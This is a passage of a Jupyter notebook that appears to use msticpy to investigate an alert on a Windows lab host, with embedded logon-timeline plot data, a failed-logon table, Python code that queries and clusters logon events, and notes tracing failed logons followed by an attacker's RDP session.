AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\ian\",\"MSTICAlertsWin1\\\\ian\",\"Window Manager\\\\DWM-3\",\"Window Manager\\\\DWM-3\",\"MSTICAlertsWin1\\\\ian\",\"MSTICAlertsWin1\\\\ian\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\ian\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\ian\",\"MSTICAlertsWin1\\\\ian\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"Window Manager\\\\DWM-2\",\"Window Manager\\\\DWM-2\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\IUSR\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\NETWORK SERVICE\",\"Window Manager\\\\DWM-1\",\"Window Manager\\\\DWM-1\",\"NT AUTHORITY\\\\LOCAL SERVICE\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"MSTICAlertsWin1\\\\MSTICAdmin\"],\"LogonType\":[5,5,5,5,5,5,5,5,4,5,5,5,5,5,5,5,5,5,4,5,5,5,5,5,5,0,5,5,2,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,4,5,5,5,5,5,5,5,5,2,2,5,3,3,3,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,4,5,5,5,5,5,5,2,2,5,5,5,5,3,3,2,2,10,5,5,5,5,5,5,3,3,2,2,10,10,5,5,5,5,5,5,5,5,5,3,3,2,2,10,10,5,5,5,5,5,5,5,4,5,5,5,5,5,5,5,5,5,5,10,5,5,3,3,3,3,2,2,5,5,5,5,5,4,5,5,5,3,3,3,3,5,5,5,5,5,5,5,0,5,5,2,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,4,5,5,4,4],\"TimeGenerated\":{\"__ndarray__\":\"AGB6IJaPdkIAYF+pkY92QgCQDW2Sj3ZCANCyu5CPdkIAoAdOkY92QgBg07aXj3ZCAFB7VpSPdkIAENJkeo92QgAw+JC9jnZCAFB3XaGOdkIAoCJPo452QgDQ/fqjjnZCAFBuBaSOdkIAUP4QpI52QgAQhBmhjnZCAJDHL5+OdkIAAEUwn452QgAwSDKfjnZCALA0MY6OdkIAwM4si452QgCweV2kjnZCACAU06OOdkIA8IWIpY52QgBQLtGjjnZCAJB8e46OdkIAIJ7Go452QgAgqMajjnZCAGCuxqOOdkIAULfGo452QgBQt8ajjnZCADC5xqOOdkIAsMTGo452QgAAyMajjnZCAICsxqOOdkIAsKzGo452QgCAtsajjnZCAPDkxqOOdkIAcOzGo452QgBw7MajjnZCAFDuxqOOdkIA8O7Go452QgDQ78ajjnZCAHDwxqOOdkIAQPHGo452QgAw9cajjnZCAPAy1pGOdkIA0CyTjI52QgCQ+tSjjnZCAOBNyIeOdkIAkAmrh452QgDgCsejjnZCAPCWzqOOdkIAcFPSo452QgCw2ZuHjnZCAICj3DyOdkIAgKPcPI52QgBgj7dFjnZCAKDTukWOdkIAMAq/RY52QgDgGqJFjnZCABAxu1KOdkIA0AmgTY52QgCAAJ6HjnZCAICBNzuOdkIA0LI7O452QgCwy1M5jnZCADC7djiOdkIAkEuiOo52QgBwTaI6jnZCAND8pTqOdkIAkEuiOo52QgBwTaI6jnZCABDu9jqOdkIAkHNlOo52QgBgKlo1jnZCACDeaDWOdkIAMIpyNY52QgCwqv02jnZCAOAb9jaOdkIA4C8UN452QgAQx1Q8jnZCACBjVTyOdkIAAJzIPI52QgCAqAU8jnZCAPCpBTyOdkIAYEA/NY52QgBgo2w2jnZCAGCjbDaOdkIAsEVdPI52QgCQE2Q8jnZCAOBedzaOdkIAoER8No52QgDAb9c1jnZCABDv1zWOdkIAAE3YNY52QgAATdg1jnZCAPCf2DWOdkIAgITaNY52QgBQOoQ7jnZCADA8hDuOdkIAkB3lRo92QgBQO7tDj3ZCAIAii0WPdkIAwMdaRY92QgDAlFtFj3ZCAFCEXEWPdkIAUIRcRY92QgDAnVxFj3ZCAMCdXEWPdkIAEMNcRY92QgBgFmdFj3ZCACAJtjmPdkIAsEhYVo92QgCwsXQ1j3ZCALBOHy+PdkIAEGJ6L492QgAgRrAvj3ZCAABy9S6PdkIAkNuTK492QgDQk5Urj3ZCAJCmliuPdkIAkKaWK492QgDgvJYrj3ZCAOC8liuPdkIA0FqXK492QgDwDZcrj3ZCAEARlyuPdkIAYOYEKI92QgCw9Ckpj3ZCAFAwmCWPdkIAQPnBLI92QgCwYr4sj3ZCAADPciyPdkIAkMdLMo92QgAwGCMVj3ZCANC39g+PdkIA8BC0EY92QgBgsowQj3ZCAMCUz/6OdkIAEInm9Y52QgDwGwcEj3ZCADB1rQWPdkIAENDO9I52QgCwEM/0jnZCAAAUz/SOdkIAIGXH9I52QgCA8Mf0jnZCAOB2zfSOdkIA8DrO9I52QgDwpM70jnZCAPCkzvSOdkIAsNA29o52QgDw1dj1jnZCAGBiW/GOdkIAQDDq6452QgBQst3HjnZCAFAs67+NdkIAEIzuv412QgBwvnGvjXZCADCQBQGOdkIAwA3t/412QgDQs+3/jXZCAGCO+f+NdkIAoLv6/412QgAQq6cAjnZCAEDaqQCOdkIAcIJMAI52QgBw7k8AjnZCALC1FQCOdkIAgNQVAI52QgBwlx8AjnZCAODBEwCOdkIAMM8TAI52QgDw1hMAjnZCADDoEwCOdkIAMOgTAI52QgDQ7RMAjnZCAFAIFACOdkIAUA4UAI52QgBwohQAjnZCABCjFACOdkIAQKcUAI52QgDQlRUAjnZCAKCgFQCOdkIA0KAVAI52QgCwohUAjnZCAPCiFQCOdkIAUKMVAI52QgBAphUAjnZCAHCmFQCOdkIAYAnt6412QgDg5g8HjnZCAHD8VQCOdkIAUGMU3I12QgBQ4DDGjXZC\",\"dtype\":\"float64\",\"shape\":[195]},\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194],\"y_index\":[2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2]},\"selected\":{\"id\":\"1289\",\"type\":\"Selection\"},\"selection_policy\":{\"id\":\"1288\",\"type\":\"UnionRenderers\"}},\"id\":\"1218\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"1285\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"data_source\":{\"id\":\"1260\",\"type\":\"ColumnDataSource\"},\"glyph\":{\"id\":\"1262\",\"type\":\"Circle\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1263\",\"type\":\"Circle\"},\"selection_glyph\":null,\"view\":{\"id\":\"1265\",\"type\":\"CDSView\"}},\"id\":\"1264\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"1286\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"callback\":null,\"formatters\":{\"Tooltip\":\"printf\"},\"tooltips\":[[\"Account\",\"@Account\"],[\"LogonType\",\"@LogonType\"]]},\"id\":\"1219\",\"type\":\"HoverTool\"},{\"attributes\":{},\"id\":\"1229\",\"type\":\"LinearScale\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"1277\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{},\"id\":\"1287\",\"type\":\"YearsTicker\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"#1f77b4\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"#1f77b4\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"1263\",\"type\":\"Circle\"},{\"attributes\":{},\"id\":\"1288\",\"type\":\"UnionRenderers\"},{\"attributes\":{},\"id\":\"1244\",\"type\":\"ResetTool\"},{\"attributes\":{\"axis_label\":\"Event Time\",\"formatter\":{\"id\":\"1253\",\"type\":\"DatetimeTickFormatter\"},\"plot\":{\"id\":\"1221\",\"subtype\":\"Figure\",\"type\":\"Plot\"},\"ticker\":{\"id\":\"1232\",\"type\":\"DatetimeTicker\"}},\"id\":\"1231\",\"type\":\"DatetimeAxis\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.5},\"fill_color\":{\"value\":\"green\"},\"line_alpha\":{\"value\":0.5},\"line_color\":{\"value\":\"green\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"1262\",\"type\":\"Circle\"},{\"attributes\":{},\"id\":\"1289\",\"type\":\"Selection\"},{\"attributes\":{\"plot\":{\"id\":\"1221\",\"subtype\":\"Figure\",\"type\":\"Plot\"},\"ticker\":{\"id\":\"1232\",\"type\":\"DatetimeTicker\"}},\"id\":\"1235\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"1227\",\"type\":\"LinearScale\"},{\"attributes\":{},\"id\":\"1290\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"source\":{\"id\":\"1260\",\"type\":\"ColumnDataSource\"}},\"id\":\"1265\",\"type\":\"CDSView\"},{\"attributes\":{},\"id\":\"1291\",\"type\":\"Selection\"},{\"attributes\":{\"callback\":null,\"data\":{\"x\":[1550287434000.0,1550287434000.0],\"y\":[0,3]},\"selected\":{\"id\":\"1293\",\"type\":\"Selection\"},\"selection_policy\":{\"id\":\"1292\",\"type\":\"UnionRenderers\"}},\"id\":\"1266\",\"type\":\"ColumnDataSource\"},{\"attributes\":{},\"id\":\"1237\",\"type\":\"BasicTicker\"}],\"root_ids\":[\"1221\"]},\"title\":\"Bokeh Application\",\"version\":\"1.0.4\"}};\n",
       "  var render_items = [{\"docid\":\"50ad8eec-5a8c-4304-b505-9ab0c91cd57c\",\"roots\":{\"1221\":\"354a44de-29e5-4344-83fc-23e9a15e046f\"}}];\n",
       "  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "\n",
       "  }\n",
       "  if (root.Bokeh !== undefined) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    var attempts = 0;\n",
       "    var timer = setInterval(function(root) {\n",
       "      if (root.Bokeh !== undefined) {\n",
       "        embed_document(root);\n",
       "        clearInterval(timer);\n",
       "      }\n",
       "      attempts++;\n",
       "      if (attempts > 100) {\n",
       "        console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n",
       "        clearInterval(timer);\n",
       "      }\n",
       "    }, 10, root)\n",
       "  }\n",
       "})(window);"
      ],
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "1221"
      }
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "### Failed Logons"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TenantId</th>\n",
       "      <th>Account</th>\n",
       "      <th>EventID</th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>SourceComputerId</th>\n",
       "      <th>Computer</th>\n",
       "      <th>SubjectUserName</th>\n",
       "      <th>SubjectDomainName</th>\n",
       "      <th>SubjectUserSid</th>\n",
       "      <th>TargetUserName</th>\n",
       "      <th>TargetDomainName</th>\n",
       "      <th>TargetUserSid</th>\n",
       "      <th>TargetLogonId</th>\n",
       "      <th>LogonProcessName</th>\n",
       "      <th>LogonType</th>\n",
       "      <th>AuthenticationPackageName</th>\n",
       "      <th>Status</th>\n",
       "      <th>IpAddress</th>\n",
       "      <th>WorkstationName</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>MSTICAlertsWin1\\ian</td>\n",
       "      <td>4625</td>\n",
       "      <td>2019-02-16 00:06:02.193</td>\n",
       "      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>ian</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>S-1-5-21-996632719-2361334927-4038480536-1120</td>\n",
       "      <td>ian</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>S-1-0-0</td>\n",
       "      <td></td>\n",
       "      <td>Advapi</td>\n",
       "      <td>2</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td>0xc000006d</td>\n",
       "      <td>-</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>MSTICAlertsWin1\\ian</td>\n",
       "      <td>4625</td>\n",
       "      <td>2019-02-15 04:09:38.523</td>\n",
       "      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>MSTICAlertsWin1$</td>\n",
       "      <td>WORKGROUP</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>ian</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>S-1-0-0</td>\n",
       "      <td></td>\n",
       "      <td>Advapi</td>\n",
       "      <td>4</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td>0xc000015b</td>\n",
       "      <td>-</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>MSTICAlertsWin1\\ian</td>\n",
       "      <td>4625</td>\n",
       "      <td>2019-02-14 04:23:55.400</td>\n",
       "      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>MSTICAlertsWin1$</td>\n",
       "      <td>WORKGROUP</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>ian</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>S-1-0-0</td>\n",
       "      <td></td>\n",
       "      <td>Advapi</td>\n",
       "      <td>4</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td>0xc000015b</td>\n",
       "      <td>-</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>MSTICAlertsWin1\\ian</td>\n",
       "      <td>4625</td>\n",
       "      <td>2019-02-13 16:28:05.417</td>\n",
       "      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>MSTICAlertsWin1$</td>\n",
       "      <td>WORKGROUP</td>\n",
       "      <td>S-1-5-18</td>\n",
       "      <td>ian</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>S-1-0-0</td>\n",
       "      <td></td>\n",
       "      <td>Advapi</td>\n",
       "      <td>4</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td>0xc000015b</td>\n",
       "      <td>-</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>MSTICAlertsWin1\\ian</td>\n",
       "      <td>4625</td>\n",
       "      <td>2019-02-12 20:28:38.637</td>\n",
       "      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>MSTICAdmin</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n",
       "      <td>ian</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>S-1-0-0</td>\n",
       "      <td></td>\n",
       "      <td>seclogo</td>\n",
       "      <td>2</td>\n",
       "      <td>Negotiate</td>\n",
       "      <td>0xc000006d</td>\n",
       "      <td>::1</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                               TenantId              Account  EventID  \\\n",
       "0  52b1ab41-869e-4138-9e40-2a4457f09bf0  MSTICAlertsWin1\\ian     4625   \n",
       "1  52b1ab41-869e-4138-9e40-2a4457f09bf0  MSTICAlertsWin1\\ian     4625   \n",
       "2  52b1ab41-869e-4138-9e40-2a4457f09bf0  MSTICAlertsWin1\\ian     4625   \n",
       "3  52b1ab41-869e-4138-9e40-2a4457f09bf0  MSTICAlertsWin1\\ian     4625   \n",
       "4  52b1ab41-869e-4138-9e40-2a4457f09bf0  MSTICAlertsWin1\\ian     4625   \n",
       "\n",
       "            TimeGenerated                      SourceComputerId  \\\n",
       "0 2019-02-16 00:06:02.193  263a788b-6526-4cdc-8ed9-d79402fe4aa0   \n",
       "1 2019-02-15 04:09:38.523  263a788b-6526-4cdc-8ed9-d79402fe4aa0   \n",
       "2 2019-02-14 04:23:55.400  263a788b-6526-4cdc-8ed9-d79402fe4aa0   \n",
       "3 2019-02-13 16:28:05.417  263a788b-6526-4cdc-8ed9-d79402fe4aa0   \n",
       "4 2019-02-12 20:28:38.637  263a788b-6526-4cdc-8ed9-d79402fe4aa0   \n",
       "\n",
       "          Computer   SubjectUserName SubjectDomainName  \\\n",
       "0  MSTICAlertsWin1               ian   MSTICAlertsWin1   \n",
       "1  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP   \n",
       "2  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP   \n",
       "3  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP   \n",
       "4  MSTICAlertsWin1        MSTICAdmin   MSTICAlertsWin1   \n",
       "\n",
       "                                  SubjectUserSid TargetUserName  \\\n",
       "0  S-1-5-21-996632719-2361334927-4038480536-1120            ian   \n",
       "1                                       S-1-5-18            ian   \n",
       "2                                       S-1-5-18            ian   \n",
       "3                                       S-1-5-18            ian   \n",
       "4   S-1-5-21-996632719-2361334927-4038480536-500            ian   \n",
       "\n",
       "  TargetDomainName TargetUserSid TargetLogonId LogonProcessName  LogonType  \\\n",
       "0  MSTICAlertsWin1       S-1-0-0                       Advapi            2   \n",
       "1  MSTICAlertsWin1       S-1-0-0                       Advapi            4   \n",
       "2  MSTICAlertsWin1       S-1-0-0                       Advapi            4   \n",
       "3  MSTICAlertsWin1       S-1-0-0                       Advapi            4   \n",
       "4  MSTICAlertsWin1       S-1-0-0                        seclogo          2   \n",
       "\n",
       "  AuthenticationPackageName      Status IpAddress  WorkstationName  \n",
       "0                 Negotiate  0xc000006d         -  MSTICAlertsWin1  \n",
       "1                 Negotiate  0xc000015b         -  MSTICAlertsWin1  \n",
       "2                 Negotiate  0xc000015b         -  MSTICAlertsWin1  \n",
       "3                 Negotiate  0xc000015b         -  MSTICAlertsWin1  \n",
       "4                 Negotiate  0xc000006d       ::1  MSTICAlertsWin1  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "\n",
    "\n",
    "from msticpy.nbtools.query_defns import DataFamily, DataEnvironment\n",
    "params_dict = {}\n",
    "params_dict.update(security_alert.query_params)\n",
    "params_dict['host_filter_eq'] = f'Computer has \\'{victim_host_entity.HostName}\\''\n",
    "params_dict['host_filter_neq'] = f'Computer !has \\'{victim_host_entity.HostName}\\''\n",
    "params_dict['host_name'] = victim_host_entity.HostName\n",
    "params_dict['start'] = security_alert.origin_time - timedelta(days=5)\n",
    "params_dict['end'] = security_alert.origin_time + timedelta(days=1)\n",
    "if victim_host_entity.OSFamily == 'Linux':\n",
    "    params_dict['data_family'] = DataFamily.LinuxSecurity\n",
    "    params_dict['path_separator'] = '/'\n",
    "else:\n",
    "    params_dict['data_family'] = DataFamily.WindowsSecurity\n",
    "    params_dict['path_separator'] = '\\\\'\n",
    "\n",
    "# # set the origin time to the time of our alert\n",
    "# logon_query_times = mas.QueryTime(units='day', origin_time=security_alert.origin_time,\n",
    "#                                   before=5, after=1, max_before=20, max_after=20)\n",
    "# logon_query_times.display()\n",
    "\n",
    "\n",
    "\n",
    "from msticpy.sectools.eventcluster import dbcluster_events, add_process_features, _string_score\n",
    "print('getting data...')\n",
    "host_logons = qry.list_host_logons(**params_dict)\n",
    "\n",
    "\n",
    "if len(host_logons) > 0:\n",
    "    logon_features = host_logons.copy()\n",
    "    logon_features['AccountNum'] = host_logons.apply(lambda x: _string_score(x.Account), axis=1)\n",
    "    logon_features['LogonIdNum'] = host_logons.apply(lambda x: _string_score(x.TargetLogonId), axis=1)\n",
    "    logon_features['LogonHour'] = host_logons.apply(lambda x: x.TimeGenerated.hour, axis=1)\n",
    "\n",
    "    # you might need to play around with the max_cluster_distance parameter.\n",
    "    # decreasing this gives more clusters.\n",
    "    (clus_logons, _, _) = dbcluster_events(data=logon_features, time_column='TimeGenerated',\n",
    "                                           cluster_columns=['AccountNum',\n",
    "                                                            'LogonType'],\n",
    "                                           max_cluster_distance=0.0001)\n",
    "#     %matplotlib inline\n",
    "#     plt.rcParams['figure.figsize'] = (12, 4)\n",
    "#     clus_logons.plot.barh(x=\"Account\", y=\"ClusterSize\")\n",
    "\n",
    "#     display(Markdown(f'Number of input events: {len(host_logons)}'))\n",
    "#     display(Markdown(f'Number of clustered events: {len(clus_logons)}'))\n",
    "#     display(Markdown('#### Distinct host logon patterns'))\n",
    "#     clus_logons.sort_values('TimeGenerated')\n",
    "#     nbdisp.display_logon_data(clus_logons)\n",
    "# else:\n",
    "#     display(Markdown('No logon events found for host.'))\n",
    "\n",
    "display(Markdown('### Classification of Logon Types by Account'))\n",
    "\n",
    "display(Markdown('### Counts of logon events by logon type.'))\n",
    "display(Markdown('Min counts for each logon type highlighted.'))\n",
    "logon_by_type = (host_logons[['Account', 'LogonType', 'EventID']]\n",
    "                .groupby(['Account','LogonType']).count().unstack()\n",
    "                .fillna(0)\n",
    "                .style\n",
    "                .background_gradient(cmap='viridis', low=.5, high=0)\n",
    "                .format(\"{0:0>3.0f}\"))\n",
    "display(logon_by_type)\n",
    "key = 'logon type key = {}'.format(';  '.join([f'{k}:{v}' for k,v in mas.nbdisplay._WIN_LOGON_TYPE_MAP.items()]))\n",
    "display(Markdown(key))\n",
    "\n",
    "display(Markdown('### Logon Timeline'))\n",
    "nbdisp.display_timeline(data=host_logons,\n",
    "                         overlay_data=host_logons.query('LogonType == 10'),\n",
    "                         alert=security_alert, \n",
    "                         source_columns=['Account', 'LogonType', 'TimeGenerated'],\n",
    "                         title='All Host Logons (RDP Logons in green)')\n",
    "\n",
    "add_observation(Observation(caption='RDP Logons seen for victim #2',\n",
    "                            description='Logons by logon type.',\n",
    "                            item=logon_by_type,\n",
    "                            link='victim2_logon_types'))\n",
    "\n",
    "display(Markdown('### Failed Logons'))\n",
    "\n",
    "failedLogons = qry.list_host_logon_failures(**params_dict)\n",
    "if failedLogons.shape[0] == 0:\n",
    "    display(print('No logon failures recorded for this host between {security_alert.start} and {security_alert.start}'))\n",
    "else:\n",
    "    display(failedLogons)\n",
    "    add_observation(Observation(caption='Logon failures seen for victim #2',\n",
    "                            description=f'{len(failedLogons)} Logons seen.',\n",
    "                            item=failedLogons,\n",
    "                            link='failed_logons'))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Observations\n",
    "- We see some Network and RemoteInteractive logons - some occuring around the time leading up to the original alert.\n",
    "- From the failed logons it looks like a few attempts were made to logon to the account name \"ian\".\n",
    "- Once the logon succeeded our attacker logged in using remote desktop."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id='examine_win_logon_sess'></a>[Contents](#toc)\n",
    "## Examine a Logon Session"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Select a Logon ID To Examine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8b2462c29f474ef7aca5a5322013ad80",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Select(description='Select logon cluster to examine', layout=Layout(height='200px', width='100%'), options=('M…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "\n",
    "\n",
    "import re\n",
    "dist_logons = clus_logons.sort_values('TimeGenerated')[['TargetUserName', 'TimeGenerated', \n",
    "                                                        'LastEventTime', 'LogonType', \n",
    "                                                        'ClusterSize']]\n",
    "items = dist_logons.apply(lambda x: (f'{x.TargetUserName}:    '\n",
    "                                     f'(logontype={x.LogonType})   '\n",
    "                                     f'timerange={x.TimeGenerated} - {x.LastEventTime}    '\n",
